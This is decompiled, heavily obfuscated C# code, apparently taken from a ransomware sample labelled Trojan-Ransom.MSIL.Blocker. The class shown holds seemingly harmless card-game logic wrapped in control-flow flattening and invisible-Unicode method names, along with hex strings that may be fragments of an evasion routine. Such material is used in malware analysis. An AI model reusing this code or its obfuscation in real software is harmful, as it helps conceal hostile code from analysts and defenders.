// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: TimeSpanTok, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: ECAE311E-CE0C-4BF9-8C57-F98A452B360E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7480e4ba962590b3f14f4516861bb1aa80ffa08223a944ee6599cfe3b4e89bce.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      bool flag1 = BaseStream == 0;
label_1:
      int num1 = 1003408703;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 876444080)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1475497246 ^ 1969951880;
            continue;
          case 2:
            flag2 = BaseStream == 1;
            num1 = 1428036836;
            continue;
          case 3:
            num1 = (int) num2 * -1278311751 ^ 1387876289;
            continue;
          case 4:
            num1 = (int) num2 * -1992249772 ^ -262314366;
            continue;
          case 5:
            num1 = (int) num2 * 67580792 ^ -1112653201;
            continue;
          case 7:
            str1 = "4574775365737369";
            num1 = (int) num2 * -1628417403 ^ 93694698;
            continue;
          case 8:
            int num3 = !flag2 ? 5121750 : (num3 = 782004553);
            num1 = num3 ^ (int) num2 * 495157159;
            continue;
          case 9:
            str1 = "71736A";
            num1 = (int) num2 * -2068065729 ^ -1532153464;
            continue;
          case 10:
            str2 = str1;
            num1 = 1082879816;
            continue;
          case 11:
            int num4 = flag1 ? 1859185283 : (num4 = 1956408676);
            num1 = num4 ^ (int) num2 * -1025413706;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1985019743;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ 1013443109)) % 3U)
      {
        case 0:
          goto label_1;
        case 2:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = 1974019663;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 69393467;
        int num2;
        bool flag;
        int num3;
        int planningCardsCount;
        int index;
        int[] planningCards;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 1194256327)) % 14U)
          {
            case 0:
              int num5 = !flag ? -137695025 : (num5 = -1700095747);
              num1 = num5 ^ (int) num4 * 1338064611;
              continue;
            case 1:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 1257324587 ^ 339083555;
              continue;
            case 2:
              planningCardsCount = num2;
              num1 = (int) num4 * 2029945589 ^ 1658127911;
              continue;
            case 3:
              goto label_1;
            case 5:
              num3 = planningCards[index];
              num1 = 1750965969;
              continue;
            case 6:
              num1 = (int) num4 * -1646156900 ^ 1411722280;
              continue;
            case 7:
              ++index;
              num1 = (int) num4 * -828243451 ^ 547771067;
              continue;
            case 8:
              num1 = 2008681786;
              continue;
            case 9:
              int num6;
              num1 = num6 = index >= planningCards.Length ? 282817533 : (num6 = 724140028);
              continue;
            case 10:
              ++num2;
              num1 = (int) num4 * 320720691 ^ 771173313;
              continue;
            case 11:
              flag = num3 > 0;
              num1 = (int) num4 * 1614201785 ^ -1062950008;
              continue;
            case 12:
              num2 = 0;
              num1 = (int) num4 * -734641098 ^ -1022670078;
              continue;
            case 13:
              num1 = (int) num4 * 725159428 ^ 1482879206;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 561590;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1211477583)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -86504422 ^ 1181263461;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_11:
      bool flag1 = index < this.PlanningCards.Length;
      int num1 = -849178830;
      int planningCard;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -543164781)) % 11U)
        {
          case 0:
            str1 = Player.\u200C​⁮‌⁪⁫‬⁫⁪⁪‌⁪‎‎‌⁪⁮⁮‎​‎‍​⁬‭‬⁬‎‭‮‏‌‍⁭⁬‬⁮⁮‌⁬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -548927947;
            continue;
          case 1:
            planningCard = this.PlanningCards[index];
            num1 = -863799770;
            continue;
          case 2:
            num1 = (int) num2 * -1449866298 ^ 907030983;
            continue;
          case 3:
            int num3 = flag2 ? 352651764 : (num3 = 1151734032);
            num1 = num3 ^ (int) num2 * -155120300;
            continue;
          case 5:
            ++index;
            num1 = -1063175183;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * 1863856062 ^ -887091087;
            continue;
          case 7:
            goto label_11;
          case 8:
            num1 = -848266467;
            continue;
          case 9:
            int num4 = !flag1 ? -217285016 : (num4 = -86727383);
            num1 = num4 ^ (int) num2 * -557401676;
            continue;
          case 10:
            flag2 = planningCard == 0;
            num1 = (int) num2 * 473931657 ^ -302361281;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 366702049;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1776604342)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 485121886 ^ 694768246;
            continue;
          case 3:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -699470406 ^ 1335744121;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = 1021515788;
      int[] numArray;
      int[] planningCards;
      int aIndex;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1831650369)) % 8U)
        {
          case 1:
            planningCards = numArray;
            num1 = (int) num2 * 404149290 ^ 342882821;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 979405158;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * 1818663270 ^ -448084834;
            continue;
          case 5:
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -2012990842 ^ -1671287525;
            continue;
          case 6:
            num1 = (int) num2 * -1825738447 ^ 1654145247;
            continue;
          case 7:
            int num3;
            num1 = num3 = aIndex >= count ? 1826895208 : (num3 = 1903309347);
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -528880794;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -560859859)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 397940219 ^ 1349987070;
            continue;
          case 3:
            str = Player.\u202E⁯‬‬‍⁪⁮‌⁫⁮⁬‪⁯‮‌⁯‫⁮‪‪​‏‮⁫‬⁪⁮‫⁬‭⁭⁪‪⁯⁬​‌‌‍‎‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 1380994160 ^ 1779365947;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200C​⁮‌⁪⁫‬⁫⁪⁪‌⁪‎‎‌⁪⁮⁮‎​‎‍​⁬‭‬⁬‎‭‮‏‌‍⁭⁬‬⁮⁮‌⁬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202E⁯‬‬‍⁪⁮‌⁫⁮⁬‪⁯‮‌⁯‫⁮‪‪​‏‮⁫‬⁪⁮‫⁬‭⁭⁪‪⁯⁬​‌‌‍‎‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
